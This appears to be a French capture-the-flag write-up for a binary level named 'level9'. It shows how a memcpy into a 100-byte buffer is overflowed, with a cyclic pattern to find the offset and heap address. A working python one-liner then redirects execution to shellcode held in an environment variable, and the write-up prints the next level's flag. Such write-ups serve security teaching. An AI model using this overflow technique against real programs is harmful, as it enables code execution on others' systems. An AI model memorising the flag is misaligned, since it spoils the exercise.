## GET Flag

Nous pouvons voir que le binaire fait un memcpy de strlen(argv[1]) sur un buffer de 100, il est ainsi possible de réaliser un overflow.

Pour nous aider à trouver l'adresse nous pouvons utiliser 

```
pattern create 200
r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
pattern search
```

On apprends trois choses : 

- Le programme seg fault au-delà de 108 caractères écrits.
- Le programme seg fault lorsqu'il tente d'accèder à `eax` (0x6941414d) `MAAi` qui est une partie de notre pattern
- On obtient l'adresse de la HEAP `0x0804a00c : offset    0 - size  200 ([heap])`.

Il est donc possible de mettre l'adresse où l'on souhaite jump soit sur la HEAP.
Puis l'addresse de cette HEAP dans eax.

```
./level9 $(python -c 'import os; print os.getenv("SCADDR") + "A" * 104 + "\x0c\xa0\x04\x08"')
```

### Flag

```
bonus0
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
